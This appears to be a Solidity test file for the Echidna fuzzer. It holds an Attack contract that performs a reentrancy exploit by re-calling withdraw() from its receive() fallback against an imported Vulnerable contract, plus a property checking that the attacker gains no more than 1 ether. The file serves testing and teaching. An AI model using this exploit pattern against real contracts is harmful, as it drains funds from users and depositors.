// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

// A helper contract that will perform the attack
contract Attack {
    Vulnerable public vulnerableContract;

    constructor(address _vulnerableAddress) {
        vulnerableContract = Vulnerable(_vulnerableAddress);
    }

    // This function is automatically called when the contract receives Ether.
    // It immediately calls withdraw() again, which is the reentrancy attack.
    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }

    function attack() public payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }
}

// Our main test contract
contract TestVulnerable {
    Vulnerable vulnerableContract;
    Attack attackContract;

    constructor() {
        vulnerableContract = new Vulnerable();
        // We deploy the attacker contract and tell it the address of the vulnerable one.
        attackContract = new Attack(address(vulnerableContract));
    }

    // This is our property. Echidna will try to make it return false.
    function echidna_reentrancy_attack() public returns (bool) {
        // The attacker sends 1 Ether to start.
        attackContract.attack{value: 1 ether}();
        
        // The rule is: "The attacker's balance should NOT be greater than 1 Ether".
        // A successful reentrancy attack will break this rule.
        return address(attackContract).balance <= 1 ether;
    }
}